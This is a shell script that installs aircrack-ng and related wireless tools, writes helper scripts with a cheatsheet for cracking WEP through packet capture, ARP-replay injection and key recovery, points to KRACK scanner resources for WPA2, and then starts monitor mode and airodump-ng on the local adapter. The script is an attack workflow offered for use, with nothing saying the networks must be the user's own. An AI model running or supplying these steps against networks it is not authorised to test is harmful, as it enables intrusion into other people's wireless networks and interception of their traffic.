clear
echo "-- UPDATING SYSTEM PLEASE WAIT"
apt-get update
apt-get dist-upgrade -y
clear

# echo "-- INSTALLING DEPENDENCIES"
apt-get install aircrack-ng
apt-get install xclip
apt-get install libnl-3-dev
apt-get install libnl-genl-3-dev
apt-get install pkg-config
apt-get install libssl-dev
apt-get install net-tools
apt-get install git
apt-get install sysfsutils
apt-get install python-scapy
apt-get install python-pycryptodome
apt-get install virtualenv
clear

# WEP
echo "clear" > WEP.sh
echo "echo '-- WEP DECODING CHEATSHEET\n'" >> WEP.sh
echo "echo '- listen to accesspoint'" >> WEP.sh
echo "echo '- airodump-ng --bssid <bssid copied earlier> -w <capture file output filename>'" >> WEP.sh
echo "echo '- on new tab packet injection'" >> WEP.sh
echo "echo '- aireplay-ng -3 <arpReplay> -b <bssid copied earlier> -h <device caught on airodump-ng output>'" >> WEP.sh
echo "echo '- decode capture file'" >> WEP.sh
echo "echo '- aircrack-ng *.cap'" >> WEP.sh
chmod +x WEP.sh

# WPA2 KRACK
echo "clear" > WPA2.sh
echo "echo '-- WPA2 DECODING CHEATSHEET'" >> WPA2.sh
echo "echo 'KRACK (Key Reinstallation attACK) scanner'" >> WPA2.sh
echo "echo 'https://www.youtube.com/watch?v=Gb8h6M22a6o'" >> WPA2.sh
echo "echo 'https://github.com/vanhoefm/krackattacks-scripts'" >> WPA2.sh
chmod +x WPA2.sh

# start up
clear
echo "-- DOCUMENTATIONS\n"
echo "- copy the bssid of chosen network before ctrl+c"
sleep 4
airmon-ng start wlan0 #change 0 to your network adapter
airodump-ng wlan0mon -W
